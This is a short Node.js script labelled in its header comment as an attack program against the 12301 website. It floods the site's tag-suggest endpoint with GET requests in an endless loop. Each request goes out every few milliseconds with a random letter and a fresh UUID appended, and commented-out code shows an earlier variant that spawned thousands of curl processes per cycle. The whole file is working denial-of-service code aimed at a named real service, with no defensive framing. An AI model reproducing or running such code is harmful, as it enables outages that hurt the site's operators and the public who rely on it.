/**
 * Created by wyq on 2016/5/12.
 * 12301网站攻击程序
 */
var preUrl = "http://www.12301.cn/tagsuggest?q=";
var async = require("async");
var _ = require("underscore");
var uuid = require("uuid");
var exec = require('child_process').exec;
var superAgent = require("./superagent.js");

var GetUuid = function () {
	var buffer = new Array(32);
	uuid.v4(null, buffer, 0);
	var string = uuid.unparse(buffer);
	string = string.replace(/-/g, "");
	return string;
};


var parList = ['q', 'w', 'e', 'r', 't', 'y', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'b', 'n', 'm'];


async.forever(
	function (cb) {
		var u1 = preUrl + parList[Math.floor(Math.random() * parList.length)] + "&uuid=" + GetUuid();
		//console.log(u1);
		var cmd = "curl " + u1;
		superAgent.httpGetNoJson(u1, function (err, o) {
			console.log("%j  %j", new Date().toLocaleString(), JSON.stringify(arguments));
		});
		setTimeout(function () {
			return cb();
		}, 5);
		/*exec(cmd, function (err, stdout, stderr) {
		 console.log("[%j] u1: %j, err: %j, stdout: %j, stderr: %j", new Date().toLocaleString(), u1, err, stdout, stderr);

		 });
		 return cb();*/
		/*for (var i = 0; i < 10000; ++i) {
		 exec(cmd, function (err, stdout, stderr) {
		 console.log("[%j] u1: %j, err: %j, stdout: %j, stderr: %j", new Date().toLocaleString(), u1, err, stdout, stderr);
		 });
		 }
		 setTimeout(function () {
		 return cb(null);
		 }, 10);*/
	},
	function (err) {
	}
);
